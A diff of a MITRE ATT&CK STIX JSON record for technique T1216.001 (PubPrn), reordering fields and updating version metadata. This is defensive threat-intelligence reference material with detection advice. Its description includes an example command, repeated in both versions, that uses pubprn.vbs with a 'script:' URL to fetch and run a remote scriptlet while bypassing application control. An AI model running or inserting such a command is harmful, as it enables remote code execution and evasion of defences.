@@ -1,67 +1,63 @@
 {
     "type": "bundle",
-    "id": "bundle--cec5c13b-88c1-428e-9296-640a2207440e",
+    "id": "bundle--9f06f0e6-f578-46c4-b0ba-23e11d831283",
     "spec_version": "2.0",
     "objects": [
         {
-            "x_mitre_platforms": [
-                "Windows"
-            ],
-            "x_mitre_domains": [
-                "enterprise-attack"
-            ],
-            "x_mitre_contributors": [
-                "Atul Nair, Qualys"
+            "type": "attack-pattern",
+            "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
+            "created": "2020-02-03T16:49:57.788Z",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "revoked": false,
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1216/001",
+                    "external_id": "T1216.001"
+                },
+                {
+                    "source_name": "pubprn",
+                    "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.",
+                    "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn"
+                },
+                {
+                    "source_name": "Enigma0x3 PubPrn Bypass",
+                    "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
+                    "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/"
+                }
             ],
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "type": "attack-pattern",
-            "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
-            "created": "2020-02-03T16:49:57.788Z",
-            "x_mitre_version": "2.0",
-            "external_references": [
-                {
-                    "source_name": "mitre-attack",
-                    "external_id": "T1216.001",
-                    "url": "https://attack.mitre.org/techniques/T1216/001"
-                },
-                {
-                    "source_name": "pubprn",
-                    "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn",
-                    "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021."
-                },
-                {
-                    "source_name": "Enigma0x3 PubPrn Bypass",
-                    "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
-                    "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018."
-                }
-            ],
-            "x_mitre_deprecated": false,
-            "revoked": false,
-            "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
-            "modified": "2022-04-18T14:55:35.817Z",
-            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "modified": "2025-04-16T20:37:14.984Z",
             "name": "PubPrn",
-            "x_mitre_detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
+            "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
             "kill_chain_phases": [
                 {
                     "kill_chain_name": "mitre-attack",
                     "phase_name": "defense-evasion"
                 }
             ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Atul Nair, Qualys"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
             "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_version": "2.1",
             "x_mitre_data_sources": [
                 "Process: Process Creation",
                 "Command: Command Execution",
                 "Script: Script Execution"
-            ],
-            "x_mitre_defense_bypassed": [
-                "Digital Certificate Validation",
-                "Application Control"
-            ],
-            "x_mitre_attack_spec_version": "2.1.0",
-            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+            ]
         }
     ]
 }
